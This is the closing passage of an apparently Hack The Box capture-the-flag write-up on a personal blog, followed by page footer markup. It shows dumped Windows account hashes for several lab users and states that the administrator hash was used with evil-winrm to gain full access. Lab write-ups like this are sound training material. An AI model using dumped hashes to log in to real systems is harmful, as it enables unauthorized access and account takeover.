class="line">audit2020:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5:::</span><br><span class="line">support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::</span><br></pre></td></tr></table></figure>

<p>and we got the administrator hash, use evil-winrm to login and we got root!</p>
<br/>
<br/>
<br/>


<p><img src="/images/root.gif" alt="root"></p>
</div></article></div></main><footer><div class="paginator"><a href="/2020/06/15/HTB-Fuse/" class="prev">PREV</a><a href="/2020/05/12/HTB-cache/" class="next">NEXT</a></div><div class="copyright"><p>© 2019 - 2023 <a href="http://example.com">Ikonw</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/MikeCoder/hexo-theme-gandalfr" target="_blank">hexo-theme-gandalfr</a>.</p></div></footer></div><script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script><script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js" crossorigin="anonymous"></script><script src="//cdn.bootcss.com/jquery/3.1.1/jquery.js" crossorigin="anonymous"></script><script>$(document).ready(function() { hljs.configure({useBR: true}); $('pre').each(function(i, block) { hljs.highlightBlock(block); }); });</script></body></html>